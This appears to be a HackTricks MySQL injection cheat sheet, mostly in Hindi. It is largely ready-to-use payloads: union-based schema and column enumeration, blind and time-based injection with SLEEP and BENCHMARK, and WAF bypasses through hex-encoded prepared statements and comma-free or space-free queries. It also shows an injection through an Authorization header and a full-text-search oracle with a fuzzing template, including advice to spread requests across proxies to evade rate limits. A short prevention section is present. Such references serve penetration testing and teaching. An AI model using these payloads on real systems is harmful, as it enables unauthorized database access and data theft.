# MySQL injection

{{#include ../../../banners/hacktricks-training.md}}



## टिप्पणियाँ
```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```
## रोचक फ़ंक्शन्स

### Mysql की पुष्टि करें:
```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```
### उपयोगी फ़ंक्शन्स
```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```
## सभी injection
```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```
from [https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)

## फ्लो

याद रखें कि "आधुनिक" **MySQL** संस्करणों में आप "_**information_schema.tables**_" को "_**mysql.innodb_table_stats**_**"** के स्थान पर प्रतिस्थापित कर सकते हैं (यह WAFs को बायपास करने में उपयोगी हो सकता है)।
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```
### **केवल 1 मान**

- `group_concat()`
- `Limit X,1`

### **Blind one by one**

- `substr(version(),X,1)='r'` or `substring(version(),X,1)=0x70` or `ascii(substr(version(),X,1))=112`
- `mid(version(),X,1)='5'`

### **Blind adding**

- `LPAD(version(),1...lenght(version()),'1')='asd'...`
- `RPAD(version(),1...lenght(version()),'1')='asd'...`
- `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
- `SELECT LEFT(version(),1...lenght(version()))='asd'...`
- `SELECT INSTR('foobarbar', 'fo...')=1`

## कॉलमों की संख्या का पता लगाना

एक सरल ORDER का उपयोग करके
```
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```
## MySQL Union Based
```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```
## SSRF

**यहाँ SSRF प्राप्त करने के विभिन्न विकल्प जानें** [**abuse a Mysql injection to obtain a SSRF**](mysql-ssrf.md)**.**

## WAF bypass tricks

### Executing queries through Prepared Statements

जब stacked queries की अनुमति हो, तो WAFs को बायपास करने के लिए यह संभव हो सकता है कि आप किसी variable को उस query के hex representation से असाइन करें जिसे आप execute करना चाहते हैं (SET का उपयोग करके), और फिर PREPARE और EXECUTE MySQL statements का उपयोग करके अंततः उस query को execute करें। कुछ ऐसा:
```
0); SET @query = 0x53454c45435420534c454550283129; PREPARE stmt FROM @query; EXECUTE stmt; #
```
अधिक जानकारी के लिए कृपया [this blog post](https://karmainsecurity.com/impresscms-from-unauthenticated-sqli-to-rce) देखें।

### Information_schema विकल्प

ध्यान रखें कि आधुनिक **MySQL** संस्करणों में आप _**information_schema.tables**_ को _**mysql.innodb_table_stats**_ या _**sys.x$schema_flattened_keys**_ या **sys.schema_table_statistics** के स्थान पर उपयोग कर सकते हैं।

### MySQLinjection बिना COMMAS

किसी भी comma का उपयोग किए बिना 2 कॉलम Select करें ([https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)):
```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```
### कॉलम नाम के बिना मान प्राप्त करना

यदि किसी बिंदु पर आप table का नाम जानते हैं लेकिन table के अंदर के columns के नाम नहीं जानते, तो आप यह पता करने की कोशिश कर सकते हैं कि कितने columns हैं, कुछ इस तरह की query execute करके:
```bash
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```
मान लीजिए वहाँ 2 कॉलम हैं (पहला कॉलम ID है) और दूसरा flag है, आप flag की सामग्री को एक-एक अक्षर करके bruteforce करने की कोशिश कर सकते हैं:
```bash
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```
अधिक जानकारी: [https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)

### SPACES के बिना Injection (`/**/` comment trick)

कुछ applications user input को sanitize या parse करने के लिए `sscanf("%128s", buf)` जैसे functions का उपयोग करते हैं, जो **पहले space character पर रुक जाते हैं**.
क्योंकि MySQL `/**/` sequence को comment *और* whitespace के रूप में treat करता है, इसे payload से normal spaces को पूरी तरह हटाने और query को syntactically valid बनाए रखने के लिए इस्तेमाल किया जा सकता है।

उदाहरण: time-based blind injection जो space filter को bypass करता है:
```http
GET /api/fabric/device/status HTTP/1.1
Authorization: Bearer AAAAAA'/**/OR/**/SLEEP(5)--/**/-'
```
जिसे डेटाबेस इस रूप में प्राप्त करता है:
```sql
' OR SLEEP(5)-- -'
```
यह विशेष रूप से उपयोगी होता है जब:

* कंट्रोल किए जाने वाला बफ़र आकार में सीमित हो (उदा. `%128s`) और spaces इनपुट को समय से पहले समाप्त कर दें।
* HTTP headers या अन्य फ़ील्ड्स के माध्यम से इंजेक्ट करना जहाँ सामान्य spaces हटाए जाते हैं या सेपरेटर के रूप में उपयोग होते हैं।
* `INTO OUTFILE` primitives के साथ मिलाकर पूर्ण pre-auth RCE प्राप्त करने के लिए (देखें MySQL File RCE section)।

---

### MySQL इतिहास

आप MySQL के अंदर तालिका पढ़ने के दौरान हुई अन्य निष्पादनों को देख सकते हैं: **sys.x$statement_analysis**

### संस्करण विकल्प**s**
```
mysql> select @@innodb_version;
mysql> select @@version;
mysql> select version();
```
## MySQL Full-Text Search (FTS) BOOLEAN MODE operator abuse (WOR)

यह एक क्लासिक SQL injection नहीं है। जब डेवलपर्स उपयोगकर्ता इनपुट को `MATCH(col) AGAINST('...' IN BOOLEAN MODE)` में पास करते हैं, तो MySQL कोटेड स्ट्रिंग के अंदर Boolean search ऑपरेटरों का एक विस्तृत सेट execute करता है। कई WAF/SAST नियम केवल quote breaking पर ध्यान देते हैं और इस सतह को मिस कर देते हैं।

मुख्य बिंदु:
- ऑपरेटर्स को उद्धरण चिह्नों के अंदर ही मूल्यांकित किया जाता है: `+` (must include), `-` (must not include), `*` (trailing wildcard), `"..."` (exact phrase), `()` (grouping), `<`/`>`/`~` (weights). See MySQL docs.
- यह string literal को तोड़े बिना उपस्थित/अनुपस्थित और prefix टेस्ट करने की अनुमति देता है, उदाहरण के लिए `AGAINST('+admin*' IN BOOLEAN MODE)` किसी भी term को जांचने के लिए जो `admin` से शुरू होता है।
- यह oracles बनाने में उपयोगी है, जैसे “क्या किसी पंक्ति में prefix X वाला कोई शब्द मौजूद है?” और prefix expansion के जरिए छिपी हुई strings को enumerate करने के लिए।

बैकएंड द्वारा निर्मित उदाहरण क्वेरी:
```sql
SELECT tid, firstpost
FROM threads
WHERE MATCH(subject) AGAINST('+jack*' IN BOOLEAN MODE);
```
यदि एप्लिकेशन परिणाम सेट खाली होने पर अलग-अलग responses लौटाती है (उदा., redirect vs. error message), तो यह व्यवहार एक Boolean oracle बन जाता है जिसका उपयोग hidden/deleted titles जैसी निजी जानकारी enumerate करने के लिए किया जा सकता है।

Sanitizer bypass patterns (generic):
- Boundary-trim preserving wildcard: यदि backend प्रत्येक शब्द के 1–2 trailing characters को regex जैसे `(\b.{1,2})(\s)|(\b.{1,2}$)` के माध्यम से trim करता है, तो `prefix*ZZ` सबमिट करें। cleaner `ZZ` को trim कर देता है पर `*` बच जाता है, इसलिए `prefix*` सुरक्षित रहता है।
- Early-break stripping: यदि code हर शब्द से operators को strip करता है पर processing रोक देता है जब उसे कोई token मिलता है जिसकी length ≥ min length हो, तो दो tokens भेजें: पहला एक junk token हो जो length threshold पूरा कर दे, दूसरा operator payload ले के आए। उदाहरण के लिए: `&&&&& +jack*ZZ` → cleaning के बाद: `+&&&&& +jack*`.

Payload template (URL-encoded):
```
keywords=%26%26%26%26%26+%2B{FUZZ}*xD
```
- `%26` का मतलब `&` है, `%2B` का मतलब `+` है। आख़िरी `xD` (या कोई भी दो अक्षर) क्लीनर द्वारा कट जाता है, `{FUZZ}*` बरकरार रहता है।
- Redirect को “match” माना जाता है और error page को “no match” माना जाता है। oracle को observable बनाए रखने के लिए redirects को auto-follow न करें।

एन्यूमरेशन वर्कफ़्लो:
1) `{FUZZ} = a…z,0…9` से शुरू करें ताकि पहले-अक्षर के मैच `+a*`, `+b*`, … के जरिए मिल सकें।
2) हर positive prefix के लिए branch करें: `a* → aa* / ab* / …`. पूरे string को recover करने के लिए दोहराएँ।
3) यदि ऐप flood control लागू करता है तो requests वितरित करें (proxies, multiple accounts)।

क्यों शीर्षक अक्सर leak करते हैं जबकि सामग्री नहीं:
- कुछ ऐप्स visibility checks केवल titles/subjects पर एक preliminary MATCH के बाद लागू करते हैं। अगर control-flow filtering से पहले “any results?” के नतीजे पर निर्भर करता है, तो existence leaks होते हैं।

रोकथाम:
- यदि आपको Boolean logic की ज़रूरत नहीं है, तो `IN NATURAL LANGUAGE MODE` का उपयोग करें या user input को literal के रूप में लें (escape/quote अन्य मोड में operators को निष्क्रिय कर देता है)।
- यदि Boolean mode आवश्यक है, तो tokenization के बाद हर token के लिए सभी Boolean operators (`+ - * " ( ) < > ~`) को strip या neutralize करें (कोई early breaks न हों)।
- MATCH से पहले visibility/authorization filters लागू करें, या जब result set खाली बनाम गैर-खाली हो तब responses को एकसमान रखें (समान timing/status)।
- अन्य DBMS में समान सुविधाओं की समीक्षा करें: PostgreSQL `to_tsquery`/`websearch_to_tsquery`, SQL Server/Oracle/Db2 `CONTAINS` भी quoted arguments के अंदर operators को parse करते हैं।

नोट्स:
- Prepared statements semantic abuse of `REGEXP` या search operators से सुरक्षा नहीं करतीं। `.*` जैसा input quoted `REGEXP '.*'` के अंदर भी permissive regex ही रहता है। allow-lists या explicit guards का उपयोग करें।

## Other MYSQL injection guides

- [PayloadsAllTheThings – MySQL Injection cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

## संदर्भ

- [PayloadsAllTheThings – MySQL Injection cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
- [Pre-auth SQLi to RCE in Fortinet FortiWeb (watchTowr Labs)](https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/)
- [MySQL Full-Text Search – Boolean mode](https://dev.mysql.com/doc/refman/8.4/en/fulltext-boolean.html)
- [MySQL Full-Text Search – Overview](https://dev.mysql.com/doc/refman/8.4/en/fulltext-search.html)
- [MySQL REGEXP documentation](https://dev.mysql.com/doc/refman/8.4/en/regexp.html)
- [ReDisclosure: New technique for exploiting Full-Text Search in MySQL (myBB case study)](https://exploit.az/posts/wor/)


{{#include ../../../banners/hacktricks-training.md}}
